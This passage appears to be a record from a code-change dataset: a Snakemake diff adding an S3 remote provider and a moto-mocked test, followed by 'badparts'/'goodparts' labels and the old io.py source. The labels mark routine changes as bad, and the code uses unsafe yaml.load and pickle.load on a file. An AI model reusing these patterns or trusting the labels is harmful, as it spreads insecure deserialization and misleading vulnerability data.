os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize / float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a/snakemake/rules.py b/snakemake/rules.py\nindex 3608167..5324eeb 100644\n--- a/snakemake/rules.py\n+++ b/snakemake/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a/snakemake/workflow.py b/snakemake/workflow.py\nindex b035bc3..833bd90 100644\n--- a/snakemake/workflow.py\n+++ b/snakemake/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a/tests/test_remote/S3Mocked.py b/tests/test_remote/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- /dev/null\n+++ b/tests/test_remote/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a/tests/test_remote/Snakefile b/tests/test_remote/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- /dev/null\n+++ b/tests/test_remote/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket/out.txt ./\")\n+\n+rule split:\n+    input: remote('test-remote-bucket/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket/prefix')\n+        for f in os.listdir(os.getcwd()+\"/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket/\"+f, \"test-remote-bucket/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm ./motoState.p\")\n+\n+onerror:\n+    shell(\"rm ./motoState.p\")\n\\ No newline at end of file\ndiff --git a/tests/test_benchmark/expected-results/test.benchmark.json b/tests/test_remote/__init__.py\nsimilarity index 100%\nrename from tests/test_benchmark/expected-results/test.benchmark.json\nrename to tests/test_remote/__init__.py\ndiff --git a/tests/test_remote/expected-results/out.txt b/tests/test_remote/expected-results/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/expected-results/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/test_remote/test.txt b/tests/test_remote/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- /dev/null\n+++ b/tests/test_remote/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a/tests/tests.py b/tests/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a/tests/tests.py\n+++ b/tests/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n", "files": {"/snakemake/dag.py": {"changes": [{"diff": "\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n", "add": 1, "remove": 1, "filename": "/snakemake/dag.py", "badparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"], "goodparts": ["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]}, "/snakemake/io.py": {"changes": [{"diff": "\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"], "goodparts": ["import functools", "from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException", "import snakemake.remote_providers.S3 as S3"]}, {"diff": "\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n", "add": 45, "remove": 3, "filename": "/snakemake/io.py", "badparts": ["    def protected(self):", "        return self.exists and not os.access(self.file, os.W_OK)", "        if not self.exists and lstat(self.file):"], "goodparts": ["    @_referToRemote", "    def exists_local(self):", "        return os.path.exists(self.file)", "    @property", "    def exists_remote(self):", "        return (self.is_remote and self.remote_object.exists())", "    def protected(self):", "        return self.exists_local and not os.access(self.file, os.W_OK)", "    @property", "    @_referToRemote", "        return lstat(self.file).st_mtime", "    @property", "    def flags(self):", "        return getattr(self._file, \"flags\", {})", "    @property", "    def mtime_local(self):", "    @_referToRemote", "    @property", "    def size_local(self):", "        self.check_broken_symlink()", "        return os.path.getsize(self.file)", "        if not self.exists_local and lstat(self.file):", "    def download_from_remote(self):", "        logger.info(\"Downloading from remote: {}\".format(self.file))", "        if self.is_remote and self.remote_object.exists():", "            self.remote_object.download()", "        else:", "            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")", "    def upload_to_remote(self):", "        logger.info(\"Uploading to remote: {}\".format(self.file))", "        if self.is_remote and not self.remote_object.exists():", "            self.remote_object.upload()", "        else:", "            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]}, {"diff": "\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n", "add": 3, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["    def touch(self):", "            lutime(self.file, None)"], "goodparts": ["    def touch(self, times=None):", "        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"", "            lutime(self.file, times)"]}, {"diff": "\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n", "add": 12, "remove": 2, "filename": "/snakemake/io.py", "badparts": ["        return IOFile(apply_wildcards(f, wildcards,", "                      rule=self.rule)"], "goodparts": ["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})", "        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,", "                                      rule=self.rule)", "        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))", "        return fileWithWildcardsApplied"]}, {"diff": "\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n", "add": 9, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["        return flag in value.flags"], "goodparts": ["        return flag in value.flags and value.flags[flag]", "    if isinstance(value, _IOFile):", "        return flag in value.flags and value.flags[flag]", "def get_flag_value(value, flag_type):", "    if isinstance(value, AnnotatedString):", "        if flag_type in value.flags:", "            return value.flags[flag_type]", "        else:", "            return None"]}, {"diff": "\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n", "add": 1, "remove": 1, "filename": "/snakemake/io.py", "badparts": ["    annotated = flag(value, \"dynamic\")"], "goodparts": ["    annotated = flag(value, \"dynamic\", True)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: 